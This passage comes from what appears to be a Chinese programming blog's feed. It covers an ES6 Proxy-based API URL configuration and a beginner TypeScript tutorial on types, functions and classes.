<li>可以使用 <strong>process.env.NODE_ENV</strong> 自定义环境变量，识别此时的运行环境</li>
</ul>
<blockquote>
<p>v2: 需求解决思路</p>
</blockquote>
<ul>
<li>可以使用<strong>ES6 中的 proxy 实现</strong></li>
</ul>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><blockquote>
<p>v1: code</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 联调环境接口判断</span></span><br><span class="line"><span class="keyword">const</span> baseUrlEnv = &#123;</span><br><span class="line">  development: <span class="string">&#x27;/test&#x27;</span>,</span><br><span class="line">  production: <span class="string">&#x27;/online&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 请求接口地址</span></span><br><span class="line"><span class="keyword">const</span> baseUrl = <span class="string">&#x27;http://www.xxx.com/&#x27;</span> + baseUrlEnv[process.env.NODE_ENV];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义URL</span></span><br><span class="line"><span class="keyword">const</span> URLSource = &#123;</span><br><span class="line">    <span class="comment">// 这里定义 account 主要是为了更加的细化请求地址</span></span><br><span class="line">  account: &#123; <span class="comment">// 账户类型接口</span></span><br><span class="line">    userInfo: baseUrl + <span class="string">&#x27;/v1/getUserInfo&#x27;</span>,</span><br><span class="line">    userlist: <span class="string">`<span class="subst">$&#123;baseUrl&#125;</span>/v1/getUserList`</span>, </span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> URLSource;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>v2: code</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义URL</span></span><br><span class="line"><span class="keyword">const</span> URLSource = &#123;</span><br><span class="line">    <span class="comment">// 这里定义 account 主要是为了更加的细化请求地址</span></span><br><span class="line">  account: &#123; <span class="comment">// 账户类型接口</span></span><br><span class="line">    userInfo: <span class="string">&#x27;/v1/&#123;type&#125;/getUserInfo&#x27;</span>,</span><br><span class="line">    userlist: <span class="string">&#x27;/v1/&#123;type&#125;/getUserList&#x27;</span>, </span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 联调环境接口判断</span></span><br><span class="line"><span class="keyword">const</span> baseUrl = &#123;</span><br><span class="line">  development: <span class="string">&#x27;/test&#x27;</span>,</span><br><span class="line">  production: <span class="string">&#x27;/online&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 代理监听 URL配置</span></span><br><span class="line"><span class="keyword">const</span> handler = &#123;</span><br><span class="line">  <span class="function"><span class="title">get</span>(<span class="params">target, key</span>)</span> &#123; <span class="comment">// get 的trap 拦截get方法</span></span><br><span class="line">    <span class="keyword">let</span> value = target[key];</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Proxy</span>(value, handler); <span class="comment">// 使用try catch 巧妙的实现了 深层 属性代理</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">typeof</span> value === <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">        <span class="comment">// 向请求地址动态绑定执行环境 如: test</span></span><br><span class="line">        value = baseUrl[process.env.NODE_ENV] + value;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 替换当前浏览器的类型 通过获取路由中的第一个路径去区分</span></span><br><span class="line">        <span class="keyword">if</span> (value.includes(<span class="string">&#x27;&#123;type&#125;&#x27;</span>)) &#123;</span><br><span class="line">          <span class="comment">// 获取 当前浏览器 pathName 路由中的第一个类型</span></span><br><span class="line">          <span class="keyword">let</span> currentType = <span class="built_in">window</span>.location.pathname.split(<span class="string">&#x27;/&#x27;</span>).filter(<span class="function">(<span class="params">item</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> item;</span><br><span class="line">          &#125;);</span><br><span class="line">          currentType = currentType.length &gt; <span class="number">0</span> ? currentType[<span class="number">0</span>].toLocaleLowerCase() : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">          <span class="keyword">if</span> ([<span class="string">&#x27;china&#x27;</span>, <span class="string">&#x27;Korea&#x27;</span>].includes(currentType)) &#123;</span><br><span class="line">            value = value.replace(<span class="string">&#x27;&#123;type&#125;&#x27;</span>, currentType);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="function"><span class="title">set</span>(<span class="params">target, key</span>)</span> &#123; <span class="comment">// 阻止外部误操作，导致URL配置文件被修改，设置属性为只读属性</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Proxy</span>(target[key], handler);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> URL = <span class="keyword">new</span> <span class="built_in">Proxy</span>(URLSource, handler);</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> URL;</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>typeScript</title>
    <url>/posts/9f19e967/</url>
    <content><![CDATA[<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><blockquote>
<p>npm  i  -g  typescript</p>
</blockquote>
<h3 id="开发辅助"><a href="#开发辅助" class="headerlink" title="开发辅助"></a>开发辅助</h3><h4 id="编译-ts为js文件"><a href="#编译-ts为js文件" class="headerlink" title="编译 ts为js文件"></a>编译 ts为js文件</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tsc xxxx.ts</span><br></pre></td></tr></table></figure>
<h4 id="在vscode中，自动编译ts"><a href="#在vscode中，自动编译ts" class="headerlink" title="在vscode中，自动编译ts"></a>在vscode中，自动编译ts</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tsc --init   // 生成配置文件</span><br><span class="line"></span><br><span class="line">out.dir :<span class="string">&#x27;&#x27;</span>  // 修改tsconfig.js字段， js生成目录</span><br><span class="line"></span><br><span class="line">选择 -&gt; 任务 -&gt; 运行任务 -&gt; 监视ts</span><br></pre></td></tr></table></figure>
<h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><ul>
<li>string             字符串</li>
<li>boolean            布尔</li>
<li>number            数值</li>
<li>Array | []         数组</li>
<li>[ 类型]           元组</li>
<li>enum                枚举</li>
</ul>
<a id="more"></a>

<ul>
<li> any                任意类型</li>
<li>undefined            未知-未定义</li>
<li>null                空</li>
<li>never             不会出现的值，包含 null 和 nudefined</li>
</ul>
<h3 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h3><ul>
<li>类的 抽象 接口 多态 泛型</li>
<li>函数 接口 泛型 传参 可省略参数  匿名函数 定义</li>
</ul>
<blockquote>
<p>如果有面向对象的后台开发语言基础 如：Java 理解起来更快</p>
</blockquote>
<h3 id="简明代码"><a href="#简明代码" class="headerlink" title="简明代码"></a>简明代码</h3><h4 id="变量的定义"><a href="#变量的定义" class="headerlink" title="变量的定义"></a>变量的定义</h4><h5 id="string字符串类型"><a href="#string字符串类型" class="headerlink" title="string字符串类型"></a>string字符串类型</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str:string = <span class="string">&quot;你好&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="boolean布尔类型"><a href="#boolean布尔类型" class="headerlink" title="boolean布尔类型"></a>boolean布尔类型</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> flag:boolean= <span class="literal">true</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="Number数值类型"><a href="#Number数值类型" class="headerlink" title="Number数值类型"></a>Number数值类型</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> num:number = <span class="number">123</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="Array数组类型"><a href="#Array数组类型" class="headerlink" title="Array数组类型"></a>Array数组类型</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> arr:number[]=[<span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>]</span><br><span class="line"><span class="keyword">var</span> arr1:<span class="built_in">Array</span>&lt;number&gt;=[<span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>];</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="元组类型"><a href="#元组类型" class="headerlink" title="[]元组类型"></a>[]元组类型</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr2:[number,string]=[<span class="number">123</span>,<span class="string">&#x27;234&#x27;</span>];</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="enum枚举类型"><a href="#enum枚举类型" class="headerlink" title="enum枚举类型"></a>enum枚举类型</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">enum COLOR &#123;</span><br><span class="line">    blue=<span class="number">123</span>, red=<span class="number">456</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 如果 没有给枚举定义的变量 复制，就是返回下标。否则返回值</span></span><br><span class="line"><span class="keyword">let</span> myColor:COLOR = COLOR.blue;</span><br><span class="line"><span class="built_in">console</span>.log(myColor)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="any任意类型"><a href="#any任意类型" class="headerlink" title="any任意类型"></a>any任意类型</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> numx:any = <span class="number">123</span>;</span><br><span class="line">numx=<span class="string">&#x27;222&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="null-undefined类型"><a href="#null-undefined类型" class="headerlink" title="null-undefined类型"></a>null-undefined类型</h5><blockquote>
<p>其它数据类型的子类型</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> nums:number|<span class="literal">undefined</span>;</span><br><span class="line"><span class="built_in">console</span>.log(nums);</span><br><span class="line">nums=<span class="number">12</span>;</span><br><span class="line"><span class="built_in">console</span>.log(nums);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="void类型"><a href="#void类型" class="headerlink" title="void类型"></a>void类型</h5><blockquote>
<p>没有任何类型 , 一般 用于 方法返回</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setAge</span>(<span class="params"></span>):<span class="title">void</span> </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">setAge();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setAges</span>(<span class="params"></span>):<span class="title">number</span> </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1211</span>;</span><br><span class="line">&#125;</span><br><span class="line">setAge();</span><br><span class="line"><span class="built_in">console</span>.log(setAges());</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="never类型"><a href="#never类型" class="headerlink" title="never类型"></a>never类型</h5><blockquote>
<p>包括null和 undefined ，表示不会出现的值</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> a:never;</span><br><span class="line">a=(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;错误&#x27;</span>);</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="函数的定义"><a href="#函数的定义" class="headerlink" title="函数的定义"></a>函数的定义</h4><h5 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> func1 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>):<span class="title">string</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func2</span>(<span class="params"></span>):<span class="title">boolean</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="传参"><a href="#传参" class="headerlink" title="传参"></a>传参</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getinfo</span>(<span class="params">name:string, age: number</span>):<span class="title">string</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`我是<span class="subst">$&#123;name&#125;</span>,年龄<span class="subst">$&#123;age&#125;</span>`</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(getinfo(<span class="string">&#x27;李三&#x27;</span>,<span class="number">20</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="无返回值"><a href="#无返回值" class="headerlink" title="无返回值"></a>无返回值</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func3</span>(<span class="params"></span>):<span class="title">void</span></span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;没返回值&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
<h5 id="可选参数"><a href="#可选参数" class="headerlink" title="可选参数"></a>可选参数</h5><blockquote>
<p> 如 使用?修饰 如 age?:number</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getinfos</span>(<span class="params">name:string, age?:number</span>):<span class="title">string</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="title">if</span>(<span class="params">age</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">`我是<span class="subst">$&#123;name&#125;</span>,年龄<span class="subst">$&#123;age&#125;</span>`</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">`我是<span class="subst">$&#123;name&#125;</span>,年龄保密`</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(getinfos(<span class="string">&#x27;李四&#x27;</span>));</span><br><span class="line"><span class="built_in">console</span>.log(getinfos(<span class="string">&#x27;李四&#x27;</span>,<span class="number">42</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="默认参数"><a href="#默认参数" class="headerlink" title="默认参数"></a>默认参数</h5><blockquote>
<p> 如 age:number=18</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getAge</span>(<span class="params">age:number=<span class="number">18</span></span>):<span class="title">number</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> age;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`我的年龄是<span class="subst">$&#123;getAge()&#125;</span>`</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`我的年龄是<span class="subst">$&#123;getAge(<span class="number">33</span>)&#125;</span>`</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="剩余参数"><a href="#剩余参数" class="headerlink" title="剩余参数"></a>剩余参数</h5><blockquote>
<p>如 …arrAy</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span>(<span class="params">...result:number[]</span>):<span class="title">number</span></span>&#123;</span><br><span class="line">    <span class="keyword">let</span> sum:number = <span class="number">0</span>;</span><br><span class="line">    result.forEach(<span class="function"><span class="params">ele</span> =&gt;</span> &#123;</span><br><span class="line">        sum+=ele;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(sum(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="函数重载"><a href="#函数重载" class="headerlink" title="函数重载"></a>函数重载</h5><blockquote>
<p>extends super</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getName</span>(<span class="params">name:string</span>):<span class="title">string</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getName</span>(<span class="params">age:number</span>):<span class="title">number</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getName</span>(<span class="params">str:any</span>):<span class="title">any</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="title">if</span>(<span class="params"><span class="keyword">typeof</span> str === <span class="string">&#x27;string&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;我叫&#x27;</span>+str;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;我的年龄是&#x27;</span>+str;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(getName(<span class="string">&#x27;王老五&#x27;</span>));</span><br><span class="line"><span class="built_in">console</span>.log(getName(<span class="number">23</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="类的定义"><a href="#类的定义" class="headerlink" title="类的定义"></a>类的定义</h4><blockquote>
<p>extends super</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 类的定义</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    name:string; <span class="comment">//属性 省略了public 关键词</span></span><br><span class="line">    private salary:number=<span class="number">10000</span>;</span><br><span class="line">    protected children:number = <span class="number">2</span>;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">name:string</span>)</span>&#123; <span class="comment">// 构造函数， 实例化的时候触发的方法</span></span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    run():<span class="keyword">void</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="built_in">this</span>.name,<span class="string">&#x27;工资：&#x27;</span>+<span class="built_in">this</span>.salary,<span class="string">&#x27;有&#x27;</span>+<span class="built_in">this</span>.children+<span class="string">&#x27;个孩子&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    getName():string&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line">    setName(name:string):<span class="keyword">void</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> person:Person = <span class="keyword">new</span> Person(<span class="string">&#x27;小明&#x27;</span>);</span><br><span class="line">person.run();</span><br><span class="line">person.setName(<span class="string">&#x27;李四&#x27;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;我的名字是：&#x27;</span>+person.getName());</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="类的继承"><a href="#类的继承" class="headerlink" title="类的继承"></a>类的继承</h5><blockquote>
<p>extends super</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WoMan</span> <span class="keyword">extends</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>(<span class="string">&#x27;女人&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> woMan:Person = <span class="keyword">new</span> WoMan();</span><br><span class="line">woMan.run();</span><br><span class="line">woMan.setName(<span class="string">&#x27;女人们&#x27;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(woMan.getName());</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="类的修饰符"><a href="#类的修饰符" class="headerlink" title="类的修饰符"></a>类的修饰符</h5><blockquote>
<p>public:     公有      在声明的类里面、继承声明的子类、调用类的实力化对象都可以访问<br>protected:  保护类型   在声明的类里面、继承声明的子类可以访问，调用类的实力化对象没法访问<br>private:    私有       在声明的类里面可以访问，继承声明的子类可以访问，调用类的实力化对象不可以访问</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man</span> <span class="keyword">extends</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    private smoke:boolean=<span class="literal">true</span>;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>(<span class="string">&#x27;男人&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    run():<span class="keyword">void</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`这个<span class="subst">$&#123;<span class="built_in">this</span>.name&#125;</span> <span class="subst">$&#123;<span class="built_in">this</span>.smoke ? <span class="string">&#x27;吸烟&#x27;</span> : <span class="string">&#x27;不吸烟&#x27;</span>&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// console.log(`这个$&#123;this.name&#125;的工资$&#123;this.salary&#125;`);</span></span><br><span class="line">        <span class="comment">// -- 提示 private修饰的salary 属性 只能在 Person 声明属性的类中访问</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`这个<span class="subst">$&#123;<span class="built_in">this</span>.name&#125;</span>有<span class="subst">$&#123;<span class="built_in">this</span>.children&#125;</span>个孩子`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> man:Person = <span class="keyword">new</span> Man();</span><br><span class="line">man.run();</span><br><span class="line">man.setName(<span class="string">&#x27;男人们&#x27;</span>);</span><br><span class="line"><span class="comment">// console.log(`这个$&#123;man.name&#125;有$&#123;man.children&#125;个孩子`);</span></span><br><span class="line"><span class="comment">// -- 提示 protected修饰的 children 属性 只能在 声明属性的类及子类内部访问</span></span><br><span class="line"><span class="built_in">console</span>.log(man.getName());</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="静态方法及属性"><a href="#静态方法及属性" class="headerlink" title="静态方法及属性"></a>静态方法及属性</h5><blockquote>
<p>私有方法不可以访问 静态的方法书静态属性<br>静态方法也不可以访问 私有的方法和私有的属性</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span> </span>&#123;</span><br><span class="line">    name:string = <span class="string">&#x27;哮天犬&#x27;</span>;</span><br><span class="line">    <span class="keyword">static</span> work:string = <span class="string">&#x27;看门&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">    eat(food:string):string&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;<span class="built_in">this</span>.name&#125;</span>吃<span class="subst">$&#123;food&#125;</span>`</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> sleep():<span class="keyword">void</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;狗睡觉&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> dog = <span class="keyword">new</span> Dog();</span><br><span class="line"><span class="built_in">console</span>.log(dog.eat(<span class="string">&#x27;骨头&#x27;</span>));</span><br><span class="line">Dog.sleep();</span><br><span class="line"><span class="built_in">console</span>.log(dog.name+Dog.work);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h5><blockquote>
<p> 多态：定义方法不去实现，让继承类去实现方法体</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">    name:string;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">name:string</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 定义方法不去实现，让继承类去实现方法体</span></span><br><span class="line">    eat(food:string):<span class="keyword">void</span>&#123;&#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cat</span> <span class="keyword">extends</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">name:string</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>(name);</span><br><span class="line">    &#125;</span><br><span class="line">    eat(food:string):<span class="keyword">void</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;<span class="built_in">this</span>.name&#125;</span>吃<span class="subst">$&#123;food&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> cat:Cat = <span class="keyword">new</span> Cat(<span class="string">&#x27;🐱猫 &#x27;</span>);</span><br><span class="line">cat.eat(<span class="string">&#x27;老鼠&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Snake</span> <span class="keyword">extends</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">name:string</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>(name);</span><br><span class="line">    &#125;</span><br><span class="line">    eat(food:string):<span class="keyword">void</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;<span class="built_in">this</span>.name&#125;</span>吃<span class="subst">$&#123;food&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> snake:Snake = <span class="keyword">new</span> Snake(<span class="string">&#x27;🐍蛇 &#x27;</span>);</span><br><span class="line">snake.eat(<span class="string">&#x27;青蛙&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h5><blockquote>
<p>abstract 修饰<br>抽象：要求该抽象类的子类(派生类)必须实现抽象方法，反之多态却可以不实现</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">abstract <span class="class"><span class="keyword">class</span> <span class="title">Food</span> </span>&#123;</span><br><span class="line">    abstract saff(food:string):boolean;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tomato</span> <span class="keyword">extends</span> <span class="title">Food</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    saff(food:string):boolean&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> tomato:Food= <span class="keyword">new</span> Tomato();</span><br><span class="line"><span class="built_in">console</span>.log(tomato.saff(<span class="string">&#x27;西红柿&#x27;</span>)?<span class="string">&#x27;西红柿是安全食物&#x27;</span>:<span class="string">&#x27;西红柿不是安全食物&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
